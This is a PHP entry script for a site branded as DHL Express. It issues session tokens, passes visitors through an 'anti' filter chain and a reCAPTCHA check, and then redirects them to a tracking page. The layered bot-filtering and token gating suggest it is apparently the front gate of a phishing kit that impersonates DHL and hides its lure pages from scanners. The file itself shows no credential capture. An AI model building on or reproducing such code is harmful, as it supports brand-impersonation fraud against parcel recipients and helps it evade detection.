<?php
/**
 * DHL Express — entry: anti stack + captcha (anti1/index.php), then track.
 * NOTE: Do not rotate token or clear captcha on every GET — anti5 redirects to
 * index.php?token=… and a second GET would otherwise wipe session and force captcha again.
 */
ob_start();
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$isCaptchaPost = $_SERVER['REQUEST_METHOD'] === 'POST'
    && !empty($_POST['g-recaptcha-response']);

if (!$isCaptchaPost) {
    $getTok = isset($_GET['token']) ? (string) $_GET['token'] : '';
    $validUrlToken = $getTok !== ''
        && (strpos($getTok, 'SPT') === 0 || strpos($getTok, 'TKN') === 0)
        && strlen($getTok) >= 10;

    if ($validUrlToken) {
        $_SESSION['dhl_track_token'] = $getTok;
        $_SESSION['token'] = $getTok;
    } elseif (!empty($_SESSION['dhl_captcha_ok']) && !empty($_SESSION['anti_verified'])) {
        // Already verified — keep session (no second captcha on return to index)
    } else {
        $token = 'SPT' . strtoupper(substr(md5((string) time() . (string) rand() . uniqid('', true)), 0, 12));
        $_SESSION['dhl_track_token'] = $token;
        $_SESSION['token'] = $token;
        $_SESSION['token_created'] = time();
        unset($_SESSION['dhl_captcha_ok'], $_SESSION['anti_verified']);
        foreach (array_keys($_SESSION) as $k) {
            if (is_string($k) && strpos($k, 'js_verified_') === 0) {
                unset($_SESSION[$k]);
            }
        }
    }
}

require_once(__DIR__ . '/anti1/index.php');

$path = str_replace('\\', '/', $_SERVER['SCRIPT_NAME'] ?? '');
$dir = dirname($path);
$baseDir = ($dir === '/' || $dir === '\\') ? '/' : rtrim($dir, '/') . '/';
$token = (string) ($_SESSION['dhl_track_token'] ?? $_SESSION['token'] ?? '');

while (ob_get_level() > 0) {
    ob_end_clean();
}
header('Location: ' . $baseDir . 'pages/track.php?token=' . urlencode($token));
exit();
